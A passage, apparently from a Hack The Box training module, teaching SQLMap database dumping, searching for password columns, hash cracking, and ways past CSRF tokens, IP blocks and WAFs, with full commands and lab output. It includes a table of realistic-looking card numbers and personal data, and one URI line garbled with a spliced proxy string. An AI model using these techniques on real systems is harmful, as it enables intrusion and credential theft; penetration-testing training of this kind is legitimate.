+[<span class="hljs-number">13</span>:<span class="hljs-number">59</span>:<span class="hljs-number">24</span>] [<span class="hljs-type">INFO</span>] fetching tables for database: <span class="hljs-string">'testdb'</span>
+<span class="hljs-type">Database</span>: testdb
+[<span class="hljs-number">4</span> tables]
++---------------+
+| member        |
+| data          |
+| international |
+| users         |
++---------------+
+</code></pre>
+<p>After spotting the table name of interest, retrieval of its content can be done by using the <code>--dump</code> option and specifying the table name with <code>-T users</code>, as follows:</p>
+<p>Database Enumeration</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> sqlmap -u <span class="hljs-string">"http://www.example.com/?id=1"</span> --dump -T users -D testdb
+
+...SNIP...
+Database: testdb
+
+Table: users
+[4 entries]
++----+--------+------------+
+|<span class="hljs-string"> id </span>|<span class="hljs-string"> name   </span>|<span class="hljs-string"> surname    </span>|
++----+--------+------------+
+|<span class="hljs-string"> 1  </span>|<span class="hljs-string"> luther </span>|<span class="hljs-string"> blisset    </span>|
+|<span class="hljs-string"> 2  </span>|<span class="hljs-string"> fluffy </span>|<span class="hljs-string"> bunny      </span>|
+|<span class="hljs-string"> 3  </span>|<span class="hljs-string"> wu     </span>|<span class="hljs-string"> ming       </span>|
+|<span class="hljs-string"> 4  </span>|<span class="hljs-string"> NULL   </span>|<span class="hljs-string"> nameisnull </span>|
++----+--------+------------+
+
+[14:07:18] [INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'
+</code></pre>
+<p>The console output shows that the table is dumped in formatted CSV format to a local file, <code>users.csv</code>.</p>
+<p>Tip: Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.</p>
+<p><img src="storage\modules\58\pVBXxRz.png" alt="sqlite"></p>
+<hr>
+<h3 id="table-row-enumeration">Table/Row Enumeration</h3>
+<p>When dealing with large tables with many columns and/or rows, we can specify the columns (e.g., only <code>name</code> and <code>surname</code> columns) with the <code>-C</code> option, as follows:</p>
+<p>Database Enumeration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+
+...SNIP...
+Database: testdb
+
+Table: users
+<span class="hljs-meta">[4 entries]</span>
+<span class="hljs-code">+--------+</span>------------+
+<span class="hljs-section">| name   | surname    |
++--------+------------+</span>
+| luther | blisset    |
+| fluffy | bunny      |
+| wu     | ming       |
+<span class="hljs-section">| NULL   | nameisnull |
++--------+------------+</span>
+</code></pre>
+<p>To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the <code>--start</code> and <code>--stop</code> options (e.g., start from 2nd up to 3rd entry), as follows:</p>
+<p>Database Enumeration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
+
+...SNIP...
+Database: testdb
+
+Table: users
+<span class="hljs-meta">[2 entries]</span>
+<span class="hljs-code">+----+</span>--------<span class="hljs-code">+---------+</span>
+<span class="hljs-section">| id | name   | surname |
++----+--------+---------+</span>
+| 2  | fluffy | bunny   |
+<span class="hljs-section">| 3  | wu     | ming    |
++----+--------+---------+</span>
+</code></pre>
+<hr>
+<h3 id="conditional-enumeration">Conditional Enumeration</h3>
+<p>If there is a requirement to retrieve certain rows based on a known <code>WHERE</code> condition (e.g. <code>name LIKE 'f%'</code>), we can use the option <code>--where</code>, as follows:</p>
+<p>Database Enumeration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE <span class="hljs-emphasis">'f%'</span>"
+
+...SNIP...
+Database: testdb
+
+Table: users
+<span class="hljs-meta">[1 entry]</span>
+<span class="hljs-code">+----+</span>--------<span class="hljs-code">+---------+</span>
+<span class="hljs-section">| id | name   | surname |
++----+--------+---------+</span>
+<span class="hljs-section">| 2  | fluffy | bunny   |
++----+--------+---------+</span>
+</code></pre>
+<hr>
+<h3 id="full-db-enumeration">Full DB Enumeration</h3>
+<p>Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of option <code>-T</code> altogether (e.g. <code>--dump -D testdb</code>). By simply using the switch <code>--dump</code> without specifying a table with <code>-T</code>, all of the current database content will be retrieved. As for the <code>--dump-all</code> switch, all the content from all the databases will be retrieved.</p>
+<p>In such cases, a user is also advised to include the switch <code>--exclude-sysdbs</code> (e.g. <code>--dump-all --exclude-sysdbs</code>), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.</p>
+<h2 id="advanced-database-enumeration">Advanced Database Enumeration</h2>
+<hr>
+<p>Now that we have covered the basics of database enumeration with SQLMap, we will cover more advanced techniques to enumerate data of interest further in this section.</p>
+<hr>
+<h3 id="db-schema-enumeration">DB Schema Enumeration</h3>
+<p>If we wanted to retrieve the structure of all of the tables so that we can have a complete overview of the database architecture, we could use the switch <code>--schema</code>:</p>
+<p>Advanced Database Enumeration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema
+
+...SNIP...
+Database: master
+Table: log
+<span class="hljs-meta">[3 columns]</span>
+<span class="hljs-code">+--------+</span>--------------+
+<span class="hljs-section">| Column | Type         |
++--------+--------------+</span>
+| date   | datetime     |
+| agent  | varchar(512) |
+<span class="hljs-section">| id     | int(11)      |
++--------+--------------+</span>
+
+Database: owasp10
+Table: accounts
+<span class="hljs-meta">[4 columns]</span>
+<span class="hljs-code">+-------------+</span>---------+
+<span class="hljs-section">| Column      | Type    |
++-------------+---------+</span>
+| cid         | int(11) |
+| mysignature | text    |
+| password    | text    |
+<span class="hljs-section">| username    | text    |
++-------------+---------+</span>
+<span class="hljs-bullet">...
+</span>Database: testdb
+Table: data
+<span class="hljs-meta">[2 columns]</span>
+<span class="hljs-code">+---------+</span>---------+
+<span class="hljs-section">| Column  | Type    |
++---------+---------+</span>
+| content | blob    |
+<span class="hljs-section">| id      | int(11) |
++---------+---------+</span>
+
+Database: testdb
+Table: users
+<span class="hljs-meta">[3 columns]</span>
+<span class="hljs-code">+---------+</span>---------------+
+<span class="hljs-section">| Column  | Type          |
++---------+---------------+</span>
+| id      | int(11)       |
+| name    | varchar(500)  |
+<span class="hljs-section">| surname | varchar(1000) |
++---------+---------------+</span>
+</code></pre>
+<hr>
+<h3 id="searching-for-data">Searching for Data</h3>
+<p>When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest, by using the <code>--search</code> option. This option enables us to search for identifier names by using the <code>LIKE</code> operator. For example, if we are looking for all of the table names containing the keyword <code>user</code>, we can run SQLMap as follows:</p>
+<p>Advanced Database Enumeration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
+
+...SNIP...
+[14:24:19] [INFO] searching tables LIKE <span class="hljs-emphasis">'user'</span>
+Database: testdb
+<span class="hljs-meta">[1 table]</span>
+<span class="hljs-code">+-----------------+</span>
+<span class="hljs-section">| users           |
++-----------------+</span>
+
+Database: master
+<span class="hljs-meta">[1 table]</span>
+<span class="hljs-code">+-----------------+</span>
+<span class="hljs-section">| users           |
++-----------------+</span>
+
+Database: information<span class="hljs-emphasis">_schema
+[1 table]
++-----------------+
+| USER_</span>PRIVILEGES |
+<span class="hljs-code">+-----------------+</span>
+
+Database: mysql
+<span class="hljs-meta">[1 table]</span>
+<span class="hljs-code">+-----------------+</span>
+<span class="hljs-section">| user            |
++-----------------+</span>
+
+do you want to dump found table(s) entries? [Y/n] 
+...SNIP...
+</code></pre>
+<p>In the above example, we can immediately spot a couple of interesting data retrieval targets based on these search results. We could also have tried to search for all column names based on a specific keyword (e.g. <code>pass</code>):</p>
+<p>Advanced Database Enumeration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
+
+...SNIP...
+columns LIKE <span class="hljs-emphasis">'pass'</span> were found in the following databases:
+Database: owasp10
+Table: accounts
+<span class="hljs-meta">[1 column]</span>
+<span class="hljs-code">+----------+</span>------+
+<span class="hljs-section">| Column   | Type |
++----------+------+</span>
+<span class="hljs-section">| password | text |
++----------+------+</span>
+
+Database: master
+Table: users
+<span class="hljs-meta">[1 column]</span>
+<span class="hljs-code">+----------+</span>--------------+
+<span class="hljs-section">| Column   | Type         |
++----------+--------------+</span>
+<span class="hljs-section">| password | varchar(512) |
++----------+--------------+</span>
+
+Database: mysql
+Table: user
+<span class="hljs-meta">[1 column]</span>
+<span class="hljs-code">+----------+</span>----------+
+<span class="hljs-section">| Column   | Type     |
++----------+----------+</span>
+<span class="hljs-section">| Password | char(41) |
++----------+----------+</span>
+
+Database: mysql
+Table: servers
+<span class="hljs-meta">[1 column]</span>
+<span class="hljs-code">+----------+</span>----------+
+<span class="hljs-section">| Column   | Type     |
++----------+----------+</span>
+<span class="hljs-section">| Password | char(64) |
++----------+----------+</span>
+</code></pre>
+<hr>
+<h3 id="password-enumeration-and-cracking">Password Enumeration and Cracking</h3>
+<p>Once we identify a table containing passwords (e.g. <code>master.users</code>), we can retrieve that table with the <code>-T</code> option, as previously shown:</p>
+<p>Advanced Database Enumeration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u <span class="hljs-string">"http://www.example.com/?id=1"</span> --dump -D master -T users
+
+...SNIP...
+[<span class="hljs-number">14</span>:<span class="hljs-number">31</span>:<span class="hljs-number">41</span>] [INFO] fetching columns <span class="hljs-keyword">for</span> table 'users' <span class="hljs-built_in">in</span> database 'master'
+[<span class="hljs-number">14</span>:<span class="hljs-number">31</span>:<span class="hljs-number">41</span>] [INFO] fetching entries <span class="hljs-keyword">for</span> table 'users' <span class="hljs-built_in">in</span> database 'master'
+[<span class="hljs-number">14</span>:<span class="hljs-number">31</span>:<span class="hljs-number">41</span>] [INFO] recognized possible password hashes <span class="hljs-built_in">in</span> column 'password'
+<span class="hljs-built_in">do</span> you want to store hashes to a temporary file <span class="hljs-keyword">for</span> eventual further processing <span class="hljs-built_in">with</span> other tools [y/N] N
+
+<span class="hljs-built_in">do</span> you want to crack them via a dictionary-based attack? [Y/n/q] Y
+
+[<span class="hljs-number">14</span>:<span class="hljs-number">31</span>:<span class="hljs-number">41</span>] [INFO] <span class="hljs-built_in">using</span> hash method 'sha1_generic_passwd'
+what dictionary <span class="hljs-built_in">do</span> you want to use?
+[<span class="hljs-number">1</span>] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[<span class="hljs-number">2</span>] custom dictionary file
+[<span class="hljs-number">3</span>] file <span class="hljs-built_in">with</span> list of dictionary files
+&gt; <span class="hljs-number">1</span>
+[<span class="hljs-number">14</span>:<span class="hljs-number">31</span>:<span class="hljs-number">41</span>] [INFO] <span class="hljs-built_in">using</span> default dictionary
+<span class="hljs-built_in">do</span> you want to use common password suffixes? (slow!) [y/N] N
+
+[<span class="hljs-number">14</span>:<span class="hljs-number">31</span>:<span class="hljs-number">41</span>] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
+[<span class="hljs-number">14</span>:<span class="hljs-number">31</span>:<span class="hljs-number">41</span>] [INFO] starting <span class="hljs-number">8</span> processes 
+[<span class="hljs-number">14</span>:<span class="hljs-number">31</span>:<span class="hljs-number">41</span>] [INFO] cracked password '<span class="hljs-number">05</span>adrian' <span class="hljs-keyword">for</span> hash '<span class="hljs-number">70</span>f361f8a1c9035a1d972a209ec5e8b726d1055e'                                                                                                         
+[<span class="hljs-number">14</span>:<span class="hljs-number">31</span>:<span class="hljs-number">41</span>] [INFO] cracked password '<span class="hljs-number">1201</span>Hunt' <span class="hljs-keyword">for</span> hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'                                                                                                         
+...SNIP...
+[<span class="hljs-number">14</span>:<span class="hljs-number">31</span>:<span class="hljs-number">47</span>] [INFO] cracked password 'Zc1uowqg6' <span class="hljs-keyword">for</span> hash '<span class="hljs-number">0</span>ff476c2676a2e5f172fe568110552f2e910c917'                                                                                                        
+Database: master                                                                                                                                                                                          
+<span class="hljs-keyword">Table</span>: users
+[<span class="hljs-number">32</span> entries]
++----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
+| <span class="hljs-type">id</span> | <span class="hljs-type">cc</span>               | <span class="hljs-type">name</span>              | <span class="hljs-type">email</span>                       | <span class="hljs-type">phone</span>        | <span class="hljs-type">address</span>                | <span class="hljs-type">birthday</span>          | <span class="hljs-type">password</span>                                                    | <span class="hljs-type">occupation</span>                                        |
+<span class="hljs-type">+----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+
+| 1</span>  | <span class="hljs-type">5387278172507117</span> | <span class="hljs-type">Maynard</span> Rice      | <span class="hljs-type">MaynardMRice</span>@yahoo.com      | <span class="hljs-type">281</span><span class="hljs-number">-559</span><span class="hljs-number">-0172</span> | <span class="hljs-type">1698</span> Bird Spring Lane  | <span class="hljs-type">March</span> <span class="hljs-number">1</span> <span class="hljs-number">1958</span>      | <span class="hljs-type">9a0f092c8d52eaf3ea423cef8485702ba2b3deb9</span> (<span class="hljs-number">3052</span>)             | <span class="hljs-type">Linemen</span>                                           |
+<span class="hljs-type">| 2</span>  | <span class="hljs-type">4539475107874477</span> | <span class="hljs-type">Julio</span> Thomas      | <span class="hljs-type">JulioWThomas</span>@gmail.com      | <span class="hljs-type">973</span><span class="hljs-number">-426</span><span class="hljs-number">-5961</span> | <span class="hljs-type">1207</span> Granville Lane    | <span class="hljs-type">February</span> <span class="hljs-number">14</span> <span class="hljs-number">1972</span>  | <span class="hljs-type">10945aa229a6d569f226976b22ea0e900a1fc219</span> (taqris)           | <span class="hljs-type">Agricultural</span> product sorter                       |
+<span class="hljs-type">| 3</span>  | <span class="hljs-type">4716522746974567</span> | <span class="hljs-type">Kenneth</span> Maloney   | <span class="hljs-type">KennethTMaloney</span>@gmail.com   | <span class="hljs-type">954</span><span class="hljs-number">-617</span><span class="hljs-number">-0424</span> | <span class="hljs-type">2811</span> Kenwood Place     | <span class="hljs-type">May</span> <span class="hljs-number">14</span> <span class="hljs-number">1989</span>       | <span class="hljs-type">a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295</span> (hibiskus)         | <span class="hljs-type">General</span> and operations manager                    |
+<span class="hljs-type">| 4</span>  | <span class="hljs-type">4929811432072262</span> | <span class="hljs-type">Gregory</span> Stumbaugh | <span class="hljs-type">GregoryBStumbaugh</span>@yahoo.com | <span class="hljs-type">410</span><span class="hljs-number">-680</span><span class="hljs-number">-5653</span> | <span class="hljs-type">1641</span> Marshall Street   | <span class="hljs-type">May</span> <span class="hljs-number">7</span> <span class="hljs-number">1936</span>        | <span class="hljs-type">b7fbde78b81f7ad0b8ce0cc16b47072a6ea5f08e</span> (spiderpig8574376) | <span class="hljs-type">Foreign</span> language interpreter                      |
+<span class="hljs-type">| 5</span>  | <span class="hljs-type">4539646911423277</span> | <span class="hljs-type">Bobby</span> Granger     | <span class="hljs-type">BobbyJGranger</span>@gmail.com     | <span class="hljs-type">212</span><span class="hljs-number">-696</span><span class="hljs-number">-1812</span> | <span class="hljs-type">4510</span> Shinn Street      | <span class="hljs-type">December</span> <span class="hljs-number">22</span> <span class="hljs-number">1939</span>  | <span class="hljs-type">aed6d83bab8d9234a97f18432cd9a85341527297</span> (<span class="hljs-number">1955</span>chev)         | <span class="hljs-type">Medical</span> records and health information technician |
+<span class="hljs-type">| 6</span>  | <span class="hljs-type">5143241665092174</span> | <span class="hljs-type">Kimberly</span> Wright   | <span class="hljs-type">KimberlyMWright</span>@gmail.com   | <span class="hljs-type">440</span><span class="hljs-number">-232</span><span class="hljs-number">-3739</span> | <span class="hljs-type">3136</span> Ralph Drive       | <span class="hljs-type">June</span> <span class="hljs-number">18</span> <span class="hljs-number">1972</span>      | <span class="hljs-type">d642ff0feca378666a8727947482f1a4702deba0</span> (Enizoom1609)      | <span class="hljs-type">Electrologist</span>                                     |
+<span class="hljs-type">| 7</span>  | <span class="hljs-type">5503989023993848</span> | <span class="hljs-type">Dean</span> Harper       | <span class="hljs-type">DeanLHarper</span>@yahoo.com       | <span class="hljs-type">440</span><span class="hljs-number">-847</span><span class="hljs-number">-8376</span> | <span class="hljs-type">3766</span> Flynn Street      | <span class="hljs-type">February</span> <span class="hljs-number">3</span> <span class="hljs-number">1974</span>   | <span class="hljs-type">2b89b43b038182f67a8b960611d73e839002fbd9</span> (raided)           | <span class="hljs-type">Store</span> detective                                   |
+<span class="hljs-type">| 8</span>  | <span class="hljs-type">4556586478396094</span> | <span class="hljs-type">Gabriela</span> Waite    | <span class="hljs-type">GabrielaRWaite</span>@msn.com      | <span class="hljs-type">732</span><span class="hljs-number">-638</span><span class="hljs-number">-1529</span> | <span class="hljs-type">2459</span> Webster Street    | <span class="hljs-type">December</span> <span class="hljs-number">24</span> <span class="hljs-number">1965</span>  | <span class="hljs-type">f5eb0fbdd88524f45c7c67d240a191163a27184b</span> (ssival47)         | <span class="hljs-type">Telephone</span> station installer                       |<span class="hljs-type"></span>
+</code></pre>
+<p>We can see in the previous example that SQLMap has automatic password hashes cracking capabilities. Upon retrieving any value that resembles a known hash format, SQLMap prompts us to perform a dictionary-based attack on the found hashes.</p>
+<p>Hash cracking attacks are performed in a multi-processing manner, based on the number of cores available on the user's computer. Currently, there is an implemented support for cracking 31 different types of hash algorithms, with an included dictionary containing 1.4 million entries (compiled over the years with most common entries appearing in publicly available password leaks). Thus, if a password hash is not randomly chosen, there is a good probability that SQLMap will automatically crack it.</p>
+<hr>
+<h3 id="db-users-password-enumeration-and-cracking">DB Users Password Enumeration and Cracking</h3>
+<p>Apart from user credentials found in DB tables, we can also attempt to dump the content of system tables containing database-specific credentials (e.g., connection credentials). To ease the whole process, SQLMap has a special switch <code>--passwords</code> designed especially for such a task:</p>
+<p>Advanced Database Enumeration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" <span class="hljs-comment">--passwords --batch</span>
+
+...SNIP...
+[14:25:20] [INFO] fetching database users password hashes
+[14:25:20] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+[14:25:20] [INFO] retrieved: 'root'
+[14:25:20] [INFO] retrieved: 'root'
+[14:25:20] [INFO] retrieved: 'root'
+[14:25:20] [INFO] retrieved: 'debian-sys-maint'
+<span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">store</span> hashes <span class="hljs-keyword">to</span> a <span class="hljs-keyword">temporary</span> <span class="hljs-keyword">file</span> <span class="hljs-keyword">for</span> eventual further processing <span class="hljs-keyword">with</span> other tools [y/N] N
+
+<span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> perform a dictionary-based attack against retrieved <span class="hljs-keyword">password</span> hashes? [Y/n/q] Y
+
+[<span class="hljs-number">14</span>:<span class="hljs-number">25</span>:<span class="hljs-number">20</span>] [INFO] <span class="hljs-keyword">using</span> <span class="hljs-keyword">hash</span> method <span class="hljs-string">'mysql_passwd'</span>
+what dictionary <span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span>?
+[<span class="hljs-number">1</span>] <span class="hljs-keyword">default</span> dictionary <span class="hljs-keyword">file</span> <span class="hljs-string">'/usr/local/share/sqlmap/data/txt/wordlist.tx_'</span> (press Enter)
+[<span class="hljs-number">2</span>] custom dictionary <span class="hljs-keyword">file</span>
+[<span class="hljs-number">3</span>] <span class="hljs-keyword">file</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">list</span> <span class="hljs-keyword">of</span> dictionary files
+&gt; <span class="hljs-number">1</span>
+[<span class="hljs-number">14</span>:<span class="hljs-number">25</span>:<span class="hljs-number">20</span>] [INFO] <span class="hljs-keyword">using</span> <span class="hljs-keyword">default</span> dictionary
+<span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> common <span class="hljs-keyword">password</span> suffixes? (slow!) [y/N] N
+
+[<span class="hljs-number">14</span>:<span class="hljs-number">25</span>:<span class="hljs-number">20</span>] [INFO] <span class="hljs-keyword">starting</span> dictionary-based cracking (mysql_passwd)
+[<span class="hljs-number">14</span>:<span class="hljs-number">25</span>:<span class="hljs-number">20</span>] [INFO] <span class="hljs-keyword">starting</span> <span class="hljs-number">8</span> processes 
+[<span class="hljs-number">14</span>:<span class="hljs-number">25</span>:<span class="hljs-number">26</span>] [INFO] cracked <span class="hljs-keyword">password</span> <span class="hljs-string">'testpass'</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">user</span> <span class="hljs-string">'root'</span>
+<span class="hljs-keyword">database</span> <span class="hljs-keyword">management</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">password</span> hashes:
+
+[*] debian-<span class="hljs-keyword">sys</span>-maint [<span class="hljs-number">1</span>]:
+    <span class="hljs-keyword">password</span> <span class="hljs-keyword">hash</span>: *<span class="hljs-number">6</span>B2C58EABD91C1776DA223B088B601604F898847
+[*] root [<span class="hljs-number">1</span>]:
+    <span class="hljs-keyword">password</span> <span class="hljs-keyword">hash</span>: *<span class="hljs-number">00E247</span>AC5F9AF26AE0194B41E1E769DEE1429A29
+    <span class="hljs-keyword">clear</span>-<span class="hljs-built_in">text</span> <span class="hljs-keyword">password</span>: testpass
+
+[<span class="hljs-number">14</span>:<span class="hljs-number">25</span>:<span class="hljs-number">28</span>] [INFO] fetched <span class="hljs-keyword">data</span> logged <span class="hljs-keyword">to</span> <span class="hljs-built_in">text</span> files <span class="hljs-keyword">under</span> <span class="hljs-string">'/home/user/.local/share/sqlmap/output/www.example.com'</span>
+
+[*] ending @ <span class="hljs-number">14</span>:<span class="hljs-number">25</span>:<span class="hljs-number">28</span> /<span class="hljs-number">2020</span><span class="hljs-number">-09</span><span class="hljs-number">-18</span>/
+</code></pre>
+<p>Tip: The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.</p>
+<p>This basically means that everything accessible will be retrieved, potentially running for a very long time. We will need to find the data of interest in the output files manually.</p>
+<h2 id="bypassing-web-application-protections">Bypassing Web Application Protections</h2>
+<hr>
+<p>There won't be any protection(s) deployed on the target side in an ideal scenario, thus not preventing automatic exploitation. Otherwise, we can expect problems when running an automated tool of any kind against such a target. Nevertheless, many mechanisms are incorporated into SQLMap, which can help us successfully bypass such protections.</p>
+<hr>
+<h3 id="anti-csrf-token-bypass">Anti-CSRF Token Bypass</h3>
+<p>One of the first lines of defense against the usage of automation tools is the incorporation of anti-CSRF (i.e., Cross-Site Request Forgery) tokens into all HTTP requests, especially those generated as a result of web-form filling.</p>
+<p>In most basic terms, each HTTP request in such a scenario should have a (valid) token value available only if the user actually visited and used the page. While the original idea was the prevention of scenarios with malicious links, where just opening these links would have undesired consequences for unaware logged-in users (e.g., open administrator pages and add a new user with predefined credentials), this security feature also inadvertently hardened the applications against the (unwanted) automation.</p>
+<p>Nevertheless, SQLMap has options that can help in bypassing anti-CSRF protection. Namely, the most important option is <code>--csrf-token</code>. By specifying the token parameter name (which should already be available within the provided request data), SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.</p>
+<p>Additionally, even in a case where the user does not explicitly specify the token's name via <code>--csrf-token</code>, if one of the provided parameters contains any of the common infixes (i.e. <code>csrf</code>, <code>xsrf</code>, <code>token</code>), the user will be prompted whether to update it in further requests:</p>
+<p>Bypassing Web Application Protections</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> sqlmap -u <span class="hljs-string">"http://www.example.com/"</span> --data=<span class="hljs-string">"id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE"</span> --csrf-token=<span class="hljs-string">"csrf-token"</span>
+
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.9}
+|<span class="hljs-string">_ -</span>|<span class="hljs-string"> . [']     </span>|<span class="hljs-string"> .'</span>|<span class="hljs-string"> . </span>|
+|<span class="hljs-string">___</span>|<span class="hljs-string">_  [)]_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">__,</span>|<span class="hljs-string">  _</span>|
+      |<span class="hljs-string">_</span>|<span class="hljs-string">V...       </span>|<span class="hljs-string">_</span>|<span class="hljs-string">   http://sqlmap.org
+
+[*] starting @ 22:18:01 /2020-09-18/
+
+POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y</span>
+</code></pre>
+<hr>
+<h3 id="unique-value-bypass">Unique Value Bypass</h3>
+<p>In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF technique described above, except that there is no need to parse the web page content. So, by simply ensuring that each request has a unique value for a predefined parameter, the web application can easily prevent CSRF attempts while at the same time averting some of the automation tools. For this, the option <code>--randomize</code> should be used, pointing to the parameter name containing a value which should be randomized before being sent:</p>
+<p>Bypassing Web Application Protections</p>
+<pre><code class="lang-shell-session"><span class="hljs-attribute">root</span>@htb[/htb]$ sqlmap -u <span class="hljs-string">"http://www.example.com/?id=1&amp;rp=29125"</span> --randomize=rp --batch -v 5 | grep URI
+
+<span class="hljs-attribute">URI</span>: http://www.example.com:80/?id=1&amp;rp=99954
+<span class="hljs-attribute">URI</span>: http://www.example.com:80/?id=1&amp;rp=87216
+<span class="hljs-attribute">URI</span>: http://www.example.com:80/?id=9030&amp;rp=36456
+<span class="hljs-attribute">URI</span>: http://www.example.com:80/?id=1.<span class="hljs-number">%2</span>C<span class="hljs-number">%29</span><span class="hljs-number">%29</span><span class="hljs-number">%27</span>.<span class="hljs-number">%28</span><span class="hljs-number">%28</span><span class="hljs-number">%2</span>C<span class="hljs-number">%22</span>&amp;rp=16689
+<span class="hljs-attribute">URI</span>: http://www.example.com:80/?id=1<span class="hljs-number">%27</span>xaFUVK<span class="hljs-number">%3</span>C<span class="hljs-number">%27</span><span class="hljs-number">%22</span><span class="hljs-number">%3</span>EHKtQrg&amp;rp=40049
+<span class="hljs-attribute">URI</span>: http://www.example.com:80/?id=1<span class="hljs-number">%29</span><span class="hljs-number">%20</span>AND<span class="hljs-number">%209368</span><span class="hljs-number">%3</span>D6381<span class="hljs-number">%20</span>AND<span class="hljs-number">%20</span><span class="hljs-number">%287422</span><span class="hljs-number">%3</span>D7422&amp;rp=95185
+</code></pre>
+<hr>
+<h3 id="calculated-parameter-bypass">Calculated Parameter Bypass</h3>
+<p>Another similar mechanism is where a web application expects a proper parameter value to be calculated based on some other parameter value(s). Most often, one parameter value has to contain the message digest (e.g. <code>h=MD5(id)</code>) of another one. To bypass this, the option <code>--eval</code> should be used, where a valid Python code is being evaluated just before the request is being sent to the target:</p>
+<p>Bypassing Web Application Protections</p>
+<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ sqlmap -u "http:/</span><span class="hljs-regexp">/www.example.com/</span>?id=<span class="hljs-number">1</span>&amp;h=c4ca4238a0b923820dcc509a6f75849b<span class="hljs-string">" --eval="</span>import hashlib; h=hashlib.md5(id).hexdigest()<span class="hljs-string">" --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b
+URI: http://www.example.com:80/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b
+URI: http://www.example.com:80/?id=9061&amp;h=4d7e0d72898ae7ea3593eb5ebf20c744
+URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&amp;h=620460a56536e2d32fb2f4842ad5a08d
+URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&amp;h=db7c815825b14d67aaa32da09b8b2d42
+URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&amp;h=02312acd4ebe69e2528382dfff7fc5cc</span>
+</code></pre>
+<hr>
+<h3 id="ip-address-concealing">IP Address Concealing</h3>
+<p>In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option <code>--proxy</code> (e.g. <code>--proxy="socks4://177.39.187.70:33283"</code>), where we should add a working proxy.</p>
+<p>In addition to that, if we have a list of proxies, we can provide them to SQLMap with the option <code>--proxy-file</code>. This way, SQLMap will go sequentially through the list, and in case of any problems (e.g., blacklisting of IP address), it will just skip from current to the next from the list. The other option is Tor network use to provide an easy to use anonymization, where our IP can appear anywhere from a large list of Tor exit nodes. When properly installed on the local machine, there should be a <code>SOCKS4</code> proxy service at the local port 9050 or 9150. By using switch <code>--tor</code>, SQLMap will automatically try to find the local port and use it appropriately.</p>
+<p>If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch <code>--check-tor</code>. In such cases, SQLMap will connect to the <code>https://check.torproject.org/</code> and check the response for the intended result (i.e., <code>Congratulations</code> appears inside).</p>
+<hr>
+<h3 id="waf-bypass">WAF Bypass</h3>
+<p>Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. <code>?pfov=...</code>) to test for the existence of a WAF (Web Application Firewall). There will be a substantial change in the response compared to the original in case of any protection between the user and the target. For example, if one of the most popular WAF solutions (ModSecurity) is implemented, there should be a <code>406 - Not Acceptable</code> response after such a request.</p>
